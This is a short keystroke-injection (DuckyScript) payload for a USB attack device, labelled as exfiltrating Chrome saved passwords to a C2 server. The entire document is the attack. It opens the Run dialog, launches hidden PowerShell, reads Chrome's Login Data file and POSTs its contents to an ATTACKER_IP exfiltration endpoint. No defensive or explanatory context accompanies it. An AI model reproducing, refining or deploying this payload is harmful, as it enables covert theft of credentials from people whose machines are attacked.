REM Exfiltrate browser passwords
REM Extracts saved passwords from Chrome and sends to C2 server

DELAY 500
GUI r
DELAY 200
STRING powershell -WindowStyle Hidden -Command "$passwords = Get-Content '$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data'; Invoke-WebRequest -Uri 'http://ATTACKER_IP:5000/api/exfil' -Method POST -Body $passwords"
ENTER
